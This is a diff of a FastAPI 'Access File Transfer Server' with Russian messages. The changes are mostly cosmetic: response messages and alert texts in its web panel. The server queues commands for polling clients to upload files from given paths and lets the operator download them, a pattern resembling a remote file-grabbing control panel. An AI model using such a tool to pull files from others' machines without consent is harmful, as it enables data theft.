@@ -8,8 +8,6 @@ import uuid
 import os
 from datetime import datetime
 import json
-import threading
-import time
 
 app = FastAPI(title="Access File Transfer Server")
 
@@ -60,7 +58,12 @@ async def create_upload_command(cmd: UploadCommand):
     }
     pending_commands.setdefault(cmd.client_id, []).append(new_command)
     print(f"[+] UPLOAD команда для {cmd.client_id}: {cmd.filepath}")
-    return CommandResponse(command_id=command_id, type="upload", status="pending")
+    return CommandResponse(
+        command_id=command_id,
+        type="upload",
+        status="pending",
+        message="Команда загрузки создана. Клиент выполнит её при следующем опросе."
+    )
 
 # 3. Получить команды для клиента
 @app.get("/commands/{client_id}")
@@ -143,7 +146,11 @@ async def upload_file(
     })
 
     print(f"[+] Файл сохранён: {save_path}")
-    return {"status": "success", "command_id": command_id}
+    return {
+        "status": "success",
+        "command_id": command_id,
+        "message": "Файл успешно загружен на сервер"
+    }
 
 # 8. Скачать файл на свой компьютер
 @app.get("/download/{command_id}")
@@ -207,7 +214,7 @@ async def main_page():
                         body: JSON.stringify({client_id: clientId})
                     });
                     const data = await res.json();
-                    alert('Команда отправлена: ' + data.command_id);
+                    alert('✅ Команда сканирования отправлена: ' + data.command_id);
                     loadFiles();
                 }
 
@@ -241,10 +248,10 @@ async def main_page():
                     });
                     const data = await res.json();
                     if (data.status === "success") {
-                        alert("✅ Файл добавлен в очередь. Клиент загрузит его при следующем опросе.");
+                        alert("✅ " + data.message);  // ← ИСПРАВЛЕНО: теперь data.message существует
                         loadDownloadedFiles();
                     } else {
-                        alert("❌ Ошибка: " + data.message);
+                        alert("❌ Ошибка: " + (data.message || "Неизвестная ошибка"));
                     }
                 }
 
